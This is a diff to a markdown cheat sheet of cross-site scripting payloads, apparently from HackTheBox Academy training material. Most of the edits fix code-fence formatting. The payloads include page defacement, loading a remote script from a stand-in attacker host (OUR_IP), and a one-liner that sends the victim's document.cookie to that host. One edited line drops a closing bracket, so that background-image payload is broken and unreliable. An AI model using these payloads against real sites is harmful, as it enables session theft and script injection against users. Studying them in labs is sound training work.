@@ -12,12 +12,13 @@
 *Description:* Basic XSS Payload
 
 ```Javascript
-<script>print()</script>```
+<script>print()</script>
+```
 *Description:* Basic XSS Payload
 
 ```Javascript
 <img src="" onerror=alert(window.origin)>
-`````
+```
 *Description:* HTML-based XSS Payload
 
 ```Javascript
@@ -26,18 +27,18 @@
 *Description:* Change Background Color
 
 ```Javascript
-<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
-`````
+<script document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
+```
 *Description:* Change Background Image
 
 ```Javascript
 <script>document.title = 'HackTheBox Academy'</script>
-`````
+```
 *Description:* Change Website Title
 
 ```Javascript
 <script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
-`````
+```
 *Description:* Overwrite website's main body
 
 ```Javascript
@@ -47,12 +48,12 @@
 
 ```Javascript
 <script src="http://OUR_IP/script.js"></script>
-`````
+```
 *Description:* Load remote script
 
 ```Javascript
 <script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>
-`````
+```
 *Description:* Send Cookie details to us
 
 ## Commands
